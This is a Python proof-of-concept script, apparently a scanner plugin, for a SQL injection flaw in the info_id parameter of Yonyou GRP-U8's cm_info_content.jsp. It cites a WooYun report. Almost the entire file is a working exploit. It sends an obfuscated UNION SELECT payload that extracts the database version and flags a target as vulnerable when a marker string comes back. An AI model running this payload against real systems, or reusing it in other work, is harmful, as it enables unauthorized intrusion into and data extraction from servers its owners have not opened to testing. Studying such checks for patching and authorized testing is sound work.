#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 用友GRP-U8 sql注入漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-0159096
author: Lucifer
description: 文件/R9iPortal/cm/cm_info_content.jsp中,参数info_id存在SQL注入。
'''
import sys
import requests
import warnings
def run(url):
        result = ['用友GRP-U8 sql注入漏洞','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/R9iPortal/cm/cm_info_content.jsp?info_id=-12/**/UnIoN/**/AlL/**/SeLeCt/**/67,67,ChAr(66)%2BChAr(66)%2BChAr(66)%2B@@version,67,67,67,67,67,67,67,67,67,67,67--"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"BBBMicrosoft" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
